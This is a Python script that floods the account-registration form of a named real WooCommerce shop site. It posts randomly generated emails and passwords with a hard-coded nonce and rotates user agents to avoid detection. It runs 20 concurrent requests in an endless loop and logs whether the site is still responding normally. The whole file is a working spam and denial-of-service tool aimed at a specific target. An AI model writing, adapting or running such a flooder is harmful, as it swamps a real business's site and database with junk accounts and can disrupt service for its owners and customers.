import requests
import random
import string
import concurrent.futures

# Load user agents from file
with open('ua.txt', 'r') as ua_file:
    user_agents = ua_file.read().splitlines()

# Possible email domains
email_domains = ["gmail.com", "yahoo.com", "yahoo.co.id", "hotmail.com", "hotmail.co.id"]

# Generate random email
def generate_email():
    name_part = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(10, 18)))
    domain = random.choice(email_domains)
    return f"{name_part}@{domain}"

# Generate random password
def generate_password():
    length = random.randint(12, 15)
    all_chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    password = ''.join(random.choice(all_chars) for _ in range(length))
    return password

# Function to send POST request
def send_post_request():
    email = generate_email()
    password = generate_password()
    nonce = "b20314b1d4"
    data = {
        "username": email.split('@')[0],
        "email": email,
        "password": password,
        "woocommerce-register-nonce": nonce,
        "_wp_http_referer": "/my-account/",
        "register": "Register"
    }

    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://pantaibsb.com",
        "DNT": "1",
        "Sec-GPC": "1",
        "Connection": "keep-alive",
        "Referer": "https://pantaibsb.com/my-account/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "TE": "trailers"
    }

    session = requests.Session()

    try:
        response = session.post("https://pantaibsb.com/my-account/", headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            send_post_request.success_counter += 1
            print(f"Data {send_post_request.success_counter} has successfully submitted! [{email}]:[{password}] [Total Data Sent: {send_post_request.success_counter}] [Website still normal on Status {response.status_code}]")
            return True
        else:
            print(f"Data has failed to submit! [REASON: HTTP Status {response.status_code}]")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Data has failed to submit! [REASON: {str(e)}]")
        return False

send_post_request.success_counter = 0

# Main function to handle sending 20 data entries at a time with no delay
def main():
    while True:
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(send_post_request) for _ in range(20)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Exiting...")
